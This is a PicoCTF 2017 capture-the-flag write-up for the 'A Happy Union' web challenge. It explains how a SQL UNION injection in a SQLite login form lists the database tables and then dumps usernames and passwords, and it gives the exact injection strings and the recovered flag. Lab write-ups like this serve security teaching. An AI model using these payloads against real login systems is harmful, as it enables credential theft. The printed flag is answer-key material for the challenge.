# PicoCTF 2017- Level 3 - Web Exploitation 2

**Title:** A Happy Union  
**Category:** Web Exploitation  
**Points:** 110  
**Description:**

>I really need access to [website](http://shell2017.picoctf.com:24264/), but I forgot my password and there is no reset. Can you help? I like lite sql :)  

**Hint:**

>A SQL union allows a single query to select values from multiples tables.  

## Solution

This is a simple SQL Union Exploit. Trying to login with the combo:
    login: a' UNION ORDER BY 10--  
    password: a  

Gives us the following error:  
    `select id, user, post from posts where user = 'a' UNION ORDER BY 10â€“';`  

Let's try to find the databases name:  
    login: ' union SELECT null, null, name FROM sqlite_master--
    password: a

The output gives us the tables name: `posts`, `sqlite_sequence`, `users`

Let's try again but by targetting the `user` table:  
    login: ' union SELECT user, pass, null FROM users--  
    password: a  

The server gives us the admin's password which is the flag: `flag{union?_why_not_onion_9f3a457c104e515c12b0f3b246c1a993}`
